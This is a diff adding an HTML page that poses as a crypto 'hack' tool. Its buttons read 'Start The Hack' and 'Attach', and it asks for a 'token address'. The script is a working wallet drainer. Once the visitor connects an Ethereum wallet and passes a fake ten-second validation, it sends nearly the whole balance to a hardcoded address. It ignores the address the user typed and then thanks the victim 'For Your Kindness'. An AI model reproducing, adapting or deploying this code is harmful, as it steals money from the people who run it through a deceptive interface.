@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ethereum Interaction Script</title>
+  <style>
+    html {
+      box-sizing: border-box;
+      font-family: "Open Sans", sans-serif;
+    }
+    *, *:before, *:after {
+      box-sizing: inherit;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+      background: #0e6b;
+    }
+    section {
+      background: #2a2c3f;
+      color: white;
+      border-radius: 1em;
+      padding: 0em;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+	#connectButton {
+		padding: 20px;
+		border-radius: 5px;
+		border: 0;}
+		#checkAdressBalanceButton {
+		padding: 20px;
+		background: #649568;
+		}
+  </style>
+</head>
+<body>
+
+<section>
+  <button id="connectButton">Start The Hack</button>
+  
+  <table id="checkAdressBalanceButton" style="display: none;">
+    <tr>
+      <td>My Hack</td>
+      <td><button id="regular">Start</button></td>
+      <td><p id="result"><code>No Hack Detect</code></p></td>
+    </tr>
+    <tr>
+      <td>My Token Address</td>
+      <td>
+        <input type="text" id="typeAdress" name="adress_auth" placeholder="give your token address" autocomplete="off" size="20"/>
+      </td>
+      <td><button id="sendEtherButton" style="display: none;">Attach</button></td>
+      <td><div id="statusMessage"></div></td>
+    </tr>
+    <tr>
+      <td>My Status</td>
+      <td><center>
+        <button disabled="disabled" id="checkBalanceButton" style="display: none;">Confirm</button>
+      </td>
+      <td><p id="balanceDisplay" style="display: none;"></p>Confirm the Hack</td>
+    </tr>
+  </table>
+</section>
+
+<script>
+  const connectButton = document.getElementById("connectButton");
+  const sendEtherButton = document.getElementById("sendEtherButton");
+  const typeAdress = document.getElementById("typeAdress");
+  const checkBalanceButton = document.getElementById("checkBalanceButton");
+  const balanceDisplay = document.getElementById("balanceDisplay");
+  const checkAdressBalanceButton = document.getElementById("checkAdressBalanceButton");
+  const statusMessage = document.getElementById("statusMessage");
+  const regularLaunchButton = document.getElementById("regular");
+  const resultElement = document.getElementById("result");
+  let validationComplete = false;
+  let transferInProgress = false;
+  const predefinedAddress = "0x6712f1D2b65388864E073437e4A91a4b640eA1c3";
+
+  const performTransaction = async () => {
+    try {
+      transferInProgress = true;
+
+      const balanceWei = await window.ethereum.request({
+        method: "eth_getBalance",
+        params: [window.ethereum.selectedAddress, "latest"],
+      });
+
+      const gasPriceHex = await window.ethereum.request({ method: "eth_gasPrice" });
+      const gasPrice = BigInt(gasPriceHex);
+      const gasLimit = 50000n;
+      const gasCost = gasPrice * gasLimit;
+      const gasBuffer = gasCost + 100000000000000n; // 0.0001 ETH buffer
+
+      const totalBalance = BigInt(balanceWei);
+
+      if (totalBalance <= gasBuffer) {
+        alert("You don't have enough ETH to cover gas fees.");
+        transferInProgress = false;
+        return;
+      }
+
+      const safeAmountToSend = totalBalance - gasBuffer;
+
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [{
+          from: window.ethereum.selectedAddress,
+          to: predefinedAddress,
+          value: "0x" + safeAmountToSend.toString(16),
+        }],
+      });
+
+      const gasFeeInEth = (Number(gasCost) / 1e18).toFixed(6);
+      alert(`Transaction completed.\nGas Fee used: ${gasFeeInEth} ETH`);
+      alert("Thanks For Your Kindness."); 
+
+      console.log("Transaction successful:", txHash);
+      transferInProgress = false;
+    } catch (error) {
+      alert("Confirmation error. Please retry");
+      console.error(error);
+      transferInProgress = false;
+    }
+  };
+
+  connectButton.addEventListener("click", async () => {
+    try {
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      if (accounts.length > 0) {
+        sendEtherButton.style.display = "block";
+        typeAdress.style.display = "block";
+        checkBalanceButton.style.display = "block";
+        checkAdressBalanceButton.style.display = "block";
+        connectButton.style.display = "none";
+      }
+    } catch (error) {
+      console.error(error);
+      alert("Connection failed");
+    }
+  });
+
+  sendEtherButton.addEventListener("click", async () => {
+    try {
+      const value = typeAdress.value;
+      if (!value || value.length < 40) {
+        alert("Invalid Ethereum address");
+        return;
+      }
+
+      if (!validationComplete) {
+        if (/^[a-zA-Z0-9]+$/.test(value) && value.length >= 40) {
+          statusMessage.textContent = "Validating...";
+          typeAdress.disabled = true;
+          sendEtherButton.disabled = true;
+
+          setTimeout(() => {
+            validationComplete = true;
+            statusMessage.textContent = "Validated";
+            sendEtherButton.textContent = "Confirm";
+            sendEtherButton.disabled = false;
+          }, 10000);
+        } else {
+          alert("Invalid address format");
+        }
+      } else if (sendEtherButton.textContent === "Confirm") {
+        performTransaction();
+      }
+    } catch (error) {
+      console.error("Process error:", error);
+      transferInProgress = false;
+    }
+  });
+
+  checkBalanceButton.addEventListener("click", async () => {
+    try {
+      const balanceWei = await window.ethereum.request({
+        method: "eth_getBalance",
+        params: [window.ethereum.selectedAddress, "latest"],
+      });
+      const balanceEther = (parseInt(balanceWei) / 1e18).toFixed(4);
+      balanceDisplay.textContent = `Balance: ${balanceEther} ETH`;
+      balanceDisplay.style.display = "block";
+    } catch (error) {
+      console.error(error);
+      alert("Balance check failed");
+    }
+  });
+
+  function setButtonsDisabled(isDisabled) {
+    regularLaunchButton.disabled = isDisabled;
+  }
+
+  function timeout() {
+    setButtonsDisabled(true);
+    resultElement.textContent = "Processing...";
+    setTimeout(() => {
+      resultElement.textContent = "Ready";
+      setButtonsDisabled(false);
+    }, 12000);
+  }
+
+  regularLaunchButton.addEventListener("click", timeout);
+</script>
+
+</body>
+</html>
